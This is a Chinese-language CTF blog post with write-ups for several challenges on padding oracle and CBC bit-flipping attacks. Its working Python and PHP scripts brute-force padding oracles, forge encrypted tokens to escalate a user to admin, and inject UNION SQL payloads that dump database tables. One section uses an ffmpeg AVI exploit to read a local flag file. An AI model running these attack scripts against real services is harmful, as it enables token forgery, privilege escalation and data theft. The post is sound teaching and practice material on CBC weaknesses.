---
title: padding_oracle 和 cbc字节反转
author: ch3n9w
typora-root-url: ../
date: 2020-02-03 16:42:20
categories: CTF
---

padding oracle 原理: https://www.freebuf.com/articles/database/150606.html

<!--more-->

## [NPUCTF2020]web狗

打开来看到了源代码

```php
<?php 
error_reporting(0);
include('config.php');   # $key,$flag
define("METHOD", "aes-128-cbc");  //定义加密方式
define("SECRET_KEY", $key);    //定义密钥
define("IV","6666666666666666");    //定义初始向量 16个6
define("BR",'<br>');
if(!isset($_GET['source']))header('location:./index.php?source=1');


#var_dump($GLOBALS);   //听说你想看这个？
function aes_encrypt($iv,$data)
{
    echo "--------encrypt---------".BR;
    echo 'IV:'.$iv.BR;
    return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;
}
function aes_decrypt($iv,$data)
{
    return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die('False');
}
if($_GET['method']=='encrypt')
{
    $iv = IV;
    $data = $flag;    
    echo aes_encrypt($iv,$data);
} else if($_GET['method']=="decrypt")
{
    $iv = @$_POST['iv'];
    $data = @$_POST['data'];
    echo aes_decrypt($iv,$data);
}
echo "我摊牌了，就是懒得写前端".BR;

if($_GET['source']==1)highlight_file(__FILE__);
?>
```

使用``padding oracle attack``来解出明文内容, 这里比较简单, 明文长度仅仅只有一个分组, 只需要修改iv求出中间值之后和原来的iv进行抑或操作就可以得到明文了, 脚本如下

```python
import base64
import requests
import time

url = "http://71a04ae9-0b21-46fd-a550-d1aa35a3619a.node3.buuoj.cn/index.php?method=decrypt&source=0"


encrypt = "ly7auKVQCZWum/W/4osuPA=="
enc = base64.b64decode(encrypt.encode("utf8"))
iv = b"6666666666666666"

get = ""
for i in range(1, 17):
    for j in range(0,256):
        iv_tmp = chr(0)*(16-i) + chr(j) + "".join([chr(ord(get[n]) ^ i) for n in range(len(get))])
        data = {
            'iv':iv_tmp,
            'data':encrypt
        }
        res = requests.post(url,data=data)
        print(res.text)
        time.sleep(1.5)
        if "False" not in res.text:
            get = chr(j ^ i)+ get
            print(get)
            print(base64.b64encode(get.encode("utf8")))
            break

print(base64.b64encode(get.encode("utf8")))
```

得到了一个地址, 访问之发现下一个问题考察cbc字节翻转攻击,题目如下

```php
<?php 
#error_reporting(0);
include('config.php');    //$fl4g
define("METHOD", "aes-128-cbc");
define("SECRET_KEY", "6666666");
session_start();

function get_iv(){    //生成随机初始向量IV
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}

$lalala = 'piapiapiapia';

if(!isset($_SESSION['Identity'])){
    $_SESSION['iv'] = get_iv();

    $_SESSION['Identity'] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION['iv']));
}
echo base64_encode($_SESSION['iv'])."<br>";

if(isset($_POST['iv'])){
    $tmp_id = openssl_decrypt(base64_decode($_SESSION['Identity']), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST['iv']));
    echo $tmp_id."<br>";
    if($tmp_id ==='weber')die($fl4g);
}

highlight_file(__FILE__);
?>
```

脚本, 注意这里需要将字符串补全到16个字节

```python
import base64

target = b'weber\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'
orginal = b'piapiapiapia\x04\x04\x04\x04'

iv = base64.b64decode("JLSjjNcJ+cOULHUC0DhRSw==")
result = b''

for i in range(16):
    result += bytes([target[i] ^ iv[i] ^ orginal[i]])

print(base64.b64encode(result))
```

![image-20211114141832885](/images/padding-oracle-and-cbc-attack/image-20211114141832885.png)



## [CISCN2019 东北赛区 Day2 Web3]Point System

打开是一个登录界面, 访问``robots.txt``, 发现一个html, 里面是很多api

![image-20200203003409598](/images/image-20200203003409598.png)

试着按照里面的使用方法来注册一个用户, 然后回到登录界面登录提示权限不足, 看看浏览器的network

![image-20200203004257291](/images/image-20200203004257291.png)

除了向login和info都请求了一次, 看看详情

向login发请求后返回的是

```
{"code":100,"data":{"token":"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9"}}
```

向info请求的头中

```
Cookie: Key=eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9
```

请求后返回的是

```
{"code":100,"data":{"user_role":3,"uid":1}}
```

token解码一下看看

```
{"signed_key":"SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1Z6lcvRnqAYZRBazce+5X7tRI6GlkrCUKZo/j72qvq9N4GeSisj3BVYYvt8Y3VFPwktIDysmCJMtJ7EAkYH5SE/w==","role":3,"user_id":1,"payload":"LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv","expire_in":1580668951}
```

sign_key解码看看

```
ICxkSingDanceRaP{A%EÒôõç!SY"Á!nÉZß|ÿíYêW/FzaAk7ûûµ:Y+	B£øûÚ«êôÞy(¬pUaíñÕü$´ò²`2Ò{	ÿ
```

"我蔡徐坤唱跳rap".............然后后面是乱码, 这个玩意就是**cbc加密的特征**, 那么signed_key就是cbc加密后经过base64的密文, 还得用``padding oracle attack``解出明文来

解密过程:

![img](/images/15078975303136.png)

![img](/images/15078976262418.png!small)

```
C1 ^ 中间值的最后一位 = 0×01
中间值的最后一位 = C1 ^ 0×01

C1 ^ 中间值的最后2位 = 0×02 0x02
中间值的最后2位 = C1 ^ (0×02 0x02)

....
一直到推出整个C2的中间值,和C1异或就得到了C2的明文
```

同理, 可以破解整个明文



这是从其他师傅偷过来的脚本

```python
import time

import requests
import base64
import json

host = "938a4575-3337-42bd-b712-45b008d529c5.node3.buuoj.cn"
port = ""

def padding_oracle(key):
    user_key_decode = base64.b64decode(key)
    user_key_json_decode = json.loads(user_key_decode)
    signed_key = user_key_json_decode['signed_key']
    signed_key_decoded = base64.b64decode(signed_key)
    url = "http://" + host + "/frontend/api/v1/user/info"

    N = 16

    total_plain = ''
   
    for block in range(0, len(signed_key_decoded) // 16 - 1):
        token = ''
        get = b""
        # 对每一块密文
        cipher = signed_key_decoded[16 + block * 16:32 + block * 16]
        # 对每一位
        for i in range(1, N+1):
            # 爆破
            for j in range(0, 256):
                time.sleep(0.1)
                # 已知位的padding对应的解密异或值
                padding = b"".join([(get[n] ^ i).to_bytes(1, 'little') for n in range(len(get))])
                # 将解密异或值 和 这块密文作为一个signed_key尝试进行解密
                c = b'\x00' * (16 - i) + j.to_bytes(1, 'little') + padding + cipher
                #print(c)
                token = base64.b64encode(c)
                user_key_json_decode['signed_key'] = token.decode("utf-8")
                header = {'Key': base64.b64encode(bytes(json.dumps(user_key_json_decode), "utf-8"))}
                res = requests.get(url, headers=header)
                #print(res.text, j)
                print(res.json())
                # 205在测试的时候就是解密不成功, 其他的情况要么是解密成功但是不符合要求和符和要求的
                if res.json()['code'] != 205:
                    get = (j ^ i).to_bytes(1, 'little') + get
                    print(get, i)
                    break
                    
		# 这里存疑, 为什么是不是signed_key_decoded[(block+1)*16 + i]呢
        plain = b"".join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, 'little') for i in range(N)])
        print(plain.decode("utf-8"), "block=%d" % block)
        total_plain += plain.decode("utf-8")
        print(total_plain)

    return total_plain


plain_text = padding_oracle("eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9")
print(plain_text)

```

慢慢的可以跑出来明文, (假装跑出来了, 其实因为buu的防护请求多了直接断开连接, 但是可以跑出几位)

```
{"role":3,"user_id":1,"payload":"LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv","expire_in":1580668951}
```

那么这个``signed_key``就是给后面的明文作为一个验证使用.

之前的那个没有权限登录, 就是这个``role``的关系, 要把它修改成1 , 就要把密文也修改了, 利用``cbc字节反转攻击``来修改密文.

![img](/images/15078975303136.png)

由于要修改的明文只是在第一区块中, 因此只需要修改IV就行了, 设 原明文为PB, 修改后的明文为PA

```
C[i] ^ PB[i] = IV[i]
C[i] ^ PA[i] = new_IV[i]

C[i] = PB[i] ^ IV[i]
PB[i] ^ PA[i] ^ IV[i] = new_IV[i]
```



还是偷来的脚本

```python
#!/usr/bin/python2.7
# -*- coding:utf8 -*-

import requests
import base64
import json

host = "dd8b9a48-d183-45ea-831c-2fe0eb2b7e29.node3.buuoj.cn"

def cbc_attack(key, block, origin_content, target_content):
    user_key_decode = base64.b64decode(key)
    user_key_json_decode = json.loads(user_key_decode)

    signed_key = user_key_json_decode['signed_key']
    cipher_o = base64.b64decode(signed_key)

    if block > 0:
        iv_prefix = cipher_o[:block * 16]
    else:
        iv_prefix = ''

    iv = cipher_o[block * 16:16 + block * 16]

    cipher = cipher_o[16 + block * 16:]

    iv_array = bytearray(iv)
    for i in range(0, 16):
        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])

    iv = bytes(iv_array)

    user_key_json_decode['signed_key'] = base64.b64encode(iv_prefix + iv + cipher)

    return base64.b64encode(json.dumps(user_key_json_decode))

def get_user_info(key):
    r = requests.post("http://" + host +  "/frontend/api/v1/user/info", headers = {"Key": key})
    if r.json()['code'] == 100:
        print("获取成功！")
    return r.json()['data']

def modify_role_palin(key, role):
    user_key_decode = base64.b64decode(user_key)
    user_key_json_decode = json.loads(user_key_decode)
    user_key_json_decode['role'] = role
    return base64.b64encode(json.dumps(user_key_json_decode))

print("翻转 Key:")
user_key = cbc_attack("eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9", 0, '{"role":3,"user_', '{"role":1,"user_')
user_key = modify_role_palin(user_key, 1)
print(user_key)
print("测试拉取用户信息：")
user_info = get_user_info(user_key)
print(user_info)
```

改完后把新的密文作为``key``访问, 刷新页面, 成功登录, 发现音频上传的功能.看赵师傅wp说**上传不同类型的文件然后下载上传的文件(如下图上传后可以在network中发现url), 对比上传前后文件的md5值发现对avi文件有进行处理**, 这个姿势学到了.

![image-20200202225510224](/images/image-20200202225510224.png)



猜测后台使用ffmpeg来对音视频进行处理(misc的东西我一点猜不到), 然后使用对应的漏洞

https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py

```
python3 gen_xbin_avi.py file:///flag test.avi
```

上传, 下载, 播放, 发现flag

![image-20200203014414962](/images/image-20200203014414962.png)



## 实验吧 简单的登陆题

真难

```python
# -*- coding:utf-8 -*-
from base64 import *
import urllib
import requests
import re

def denglu(payload,idx,c1,c2):
    url=r'http://ctf5.shiyanbar.com/web/jiandan/index.php'
    payload = {'id': payload}
    r = requests.post(url, data=payload)
    Set_Cookie=r.headers['Set-Cookie']
    iv=re.findall(r"iv=(.*?),", Set_Cookie)[0]
    cipher=re.findall(r"cipher=(.*)", Set_Cookie)[0]
    iv_raw = b64decode(urllib.unquote(iv))
    cipher_raw=b64decode(urllib.unquote(cipher))
    lst=list(cipher_raw)
    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))
    cipher_new=''.join(lst)
    cipher_new=urllib.quote(b64encode(cipher_new))
    cookie_new={'iv': iv,'cipher':cipher_new}
    r = requests.post(url, cookies=cookie_new)
    cont=r.content
    plain = re.findall(r"base64_decode\('(.*?)'\)", cont)[0]
    plain = b64decode(plain)
    first='a:1:{s:2:"id";s:'
    iv_new=''
    for i in range(16):
        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))
    iv_new = urllib.quote(b64encode(iv_new))
    cookie_new = {'iv': iv_new, 'cipher': cipher_new}
    r = requests.post(url, cookies=cookie_new)
    rcont = r.content
    print rcont

denglu('12',4,'2','#')
denglu('0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'+chr(0),6,'2','u')
denglu('0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'+chr(0),7,'2','u')
denglu("0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"+chr(0),7,'2','u')
denglu("0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);"+chr(0),6,'2','u')
```


自己的脚本会出现错误

```python
import requests
import base64
import urllib
import re

url='http://ctf5.shiyanbar.com/web/jiandan/index.php'
post={'id':"0 2nion select * from((select 1)a join (select 2)b join (select 3)c);"+chr(0)}
responce=requests.post(url,data=post)

iv=base64.b64decode(urllib.unquote(re.findall(r"iv=(.*?),",responce.headers['Set-Cookie'])[0]))
cipher=base64.b64decode(urllib.unquote(re.findall(r"cipher=(.*)",responce.headers['Set-Cookie'])[0]))

def answer(cipher,old_iv,offset,old_letter,new_letter):
    cipher=list(cipher)
    cipher[offset]=chr(ord(old_letter)^ord(new_letter)^ord(cipher[offset]))
    cipher=''.join(cipher)
    cookie={'cipher':urllib.quote(base64.b64encode(cipher)),'iv':urllib.quote(base64.b64encode(old_iv))}
    res=requests.post(url,cookies=cookie)
    wrong_plain=base64.b64decode(re.findall(r"base64_decode\('(.*?)'\)",res.content)[0])
    new_iv = ''
    right='a:1:{s:2:"id";s:'
    for i in range(16):
        new_iv+=chr(ord(old_iv[i])^ord(wrong_plain[i])^ord(right[i]))
    cookie={'cipher':urllib.quote(base64.b64encode(cipher)),'iv':urllib.quote(base64.b64encode(new_iv))}
    res=requests.post(url,cookies=cookie)
    print res.content


answer(cipher,iv,7,'2','u')
```

错误报告如下：

```
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near '2)ion select * from((select 1)a
join (select 2)b join (select 3)c);' at line 1
```

也就是说改变的位置发生了变化，但是对另一些payload来说却可以正常运行，很是奇怪，难道是正则表达式的问题?
明白了，正则表达式没有问题，是自己以为前面字段一样序列化之后前面的字段也会一样的原因导致，其实是不一样的
一个偏移位置为6，一个为7，这个正则要好好看看



## javisoj xman 2019 xbitf

源代码如下：

```python
class Unbuffered(object):
   def __init__(self, stream):
       self.stream = stream
   def write(self, data):
       self.stream.write(data)
       self.stream.flush()
   def __getattr__(self, attr):
       return getattr(self.stream, attr)
import sys
sys.stdout = Unbuffered(sys.stdout)
#import signal
#signal.alarm(600)

import random
import time
flag=open("/root/xbitf/flag","r").read()

from Crypto.Cipher import AES
import os

def aes_cbc(key,iv,m):
    handler=AES.new(key,AES.MODE_CBC,iv)
    return handler.encrypt(m).encode("hex")
def aes_cbc_dec(key,iv,c):
    handler=AES.new(key,AES.MODE_CBC,iv)
    return handler.decrypt(c.decode("hex"))

key=os.urandom(16)
iv=os.urandom(16)
session=os.urandom(8)

token="session="+session.encode("hex")+";admin=0"
 
checksum=aes_cbc(key,iv,token)
print token+";checksum="+checksum
for i in range(10):
    token_rcv=raw_input("token:")
    if token_rcv.split("admin=")[1][0]=='1' and token_rcv.split("session=")[1][0:16].decode("hex")==session:
        c_rcv=token_rcv.split("checksum=")[1].strip()
        m_rcv=aes_cbc_dec(key,iv,c_rcv)
        # 讲解码的结果打印出来
        print m_rcv
        if m_rcv.split("admin=")[1][0]=='1':
            print flag
```

解题脚本

```py
plain = "session=c3b76cc709a8fddf;admin=0"
checksum="92b612cdfa0abf5a415ab73f7f19826853473d7b02378fc836c6248502390b29"

bit = (ord(checksum.decode('hex')[15]) ^ord('0') ^ ord('1'))

# 每个16位加密之后都会变成32位，这里要替换第一组的最后一个字节所加密后的内容
checksum_final = checksum[:30] + hex(bit)[2:] + checksum[32:]
print checksum_final
```



在session通过之后就不再对session进行验证了，所以前16位乱码也没有关系。

![image-20211114141845867](/images/padding-oracle-and-cbc-attack/image-20211114141845867.png)

## bugku login4

这道题由于自己没有认认真真去做，导致做出来花费了很多时间。相关writeup如下：

https://blog.csdn.net/zpy1998zpy/article/details/80684485

https://www.jianshu.com/p/a61756e54f4f

自己的代码如下：

```php
<?php
$iv='4NyZMJ9AOU5JGstqfld10A%3D%3D';
$cipher='T3tpIgej42eqA3etE61DRqavWBNrphk4dxENvNgSoYUBiB07C5YKCPwtOUm9pZYINeDrM%2BelzJ3sezJaHufNkA%3D%3D';
//username=bdmin password=111

$iv=base64_decode(urldecode($iv));
$cipher=base64_decode(urldecode(($cipher)));

$source=array('username'=>'bdmin','password'=>'111');
$plain=serialize($source);

$plain1 = substr($plain,0,16);
$plain2 = substr($plain,16,16);

$cipher[9] = chr(ord($cipher[9])^ord('b')^ord('a'));

$new_iv='';
$wrong_plain=base64_decode("U0odmU+LM2Bc4HLVCFql2G1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjExMSI7fQ==");
for($i=0;$i<16;$i++){
    $new_iv.=chr(ord($wrong_plain[$i])^ord($plain1[$i])^ord($iv[$i]));
}

echo urlencode(base64_encode($new_iv)).'   '.urlencode(base64_encode($cipher));

```

